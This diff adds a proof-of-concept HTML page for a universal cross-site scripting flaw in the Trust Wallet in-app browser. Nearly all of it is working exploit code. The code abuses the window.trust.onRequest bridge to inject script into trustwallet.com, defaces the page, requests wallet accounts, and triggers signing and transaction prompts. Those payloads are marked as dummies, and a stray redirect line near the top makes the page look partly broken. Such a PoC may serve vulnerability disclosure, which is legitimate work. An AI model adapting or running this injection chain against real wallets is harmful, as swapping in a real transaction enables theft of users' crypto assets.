@@ -1,0 +1,86 @@
+<!doctype html>
+<html><head>
+<meta charset="utf-8">
+<title>Trust Wallet UXSS</title>
+</head><body>
+<a id="run" href="https://trustwallet.com/">Trigger UXSS</a>
+<pre id="status"></pre>
+<script>
+  location="http://google.com:83"
+const status = document.querySelector('#status');
+const runLink = document.querySelector('#run');
+const dummyMessage = 'Trust Wallet UXSS lab test only. No authorization or asset transfer.';
+const dummyMessageHex = '0x' + Array.from(new TextEncoder().encode(dummyMessage),
+  byte => byte.toString(16).padStart(2, '0')).join('');
+
+const injectedId = `(
+  location.hostname === "trustwallet.com" && !window.__uxssChainTriggered
+    ? (
+      window.__uxssChainTriggered = true,
+      document.write('<h1>UXSS</ha1><br><h1>PWNED BY BADCAT</h1>'),
+      alert(document.domain),
+      (async () => {
+        if (!window.ethereum || typeof window.ethereum.request !== "function") return;
+        let accounts;
+        try {
+          console.log("UXSS impact: connect requested from", document.domain);
+          accounts = await window.ethereum.request({method: "eth_requestAccounts"});
+        } catch (error) { console.log("UXSS impact: connect rejected", String(error)); return; }
+        if (!accounts || !accounts[0]) return;
+        try {
+          console.log("UXSS impact: dummy sign requested from", document.domain);
+          await window.ethereum.request({
+            method: "personal_sign",
+            params: ["${dummyMessageHex}", accounts[0]]
+          });
+        } catch (error) { console.log("UXSS impact: dummy sign rejected", String(error)); }
+        try {
+          console.log("UXSS impact: invalid dummy tx requested from", document.domain);
+          await window.ethereum.request({
+            method: "eth_sendTransaction",
+            params: [{
+              from: "0x0000000000000000000000000000000000000001",
+              to: "0xdead",
+              value: "0x0",
+              gas: "0x0",
+              data: "0x"
+            }]
+          });
+        } catch (error) { console.log("UXSS impact: invalid dummy tx rejected", String(error)); }
+      })()
+    )
+    : 0,
+  0
+)`;
+
+let armed = false;
+runLink.addEventListener('click', (event) => {
+  if (!window.trust || typeof window.trust.onRequest !== 'function') {
+    event.preventDefault();
+    status.textContent = 'Open this page in the Trust Wallet DApp/Web3 browser.';
+    return;
+  }
+  if (!armed) {
+    armed = true;
+    status.textContent = 'Navigating to …';
+    window.addEventListener('pagehide', () => {
+  
+      for (let i = 0; i < 12; i++) {
+        try {
+          window.trust.onRequest(JSON.stringify({
+            id: `(${injectedId},${i})`,
+            network: 'ethereum',
+            name: 'rpcCall',
+            object: {method: 'eth_blockNumber', params: []}
+          }));
+        } catch (error) {
+          console.error('UXSS PoC bridge request failed:', error);
+          break;
+        }
+      }
+    }, {once: true});
+  }
+
+});
+</script>
+</body></html>
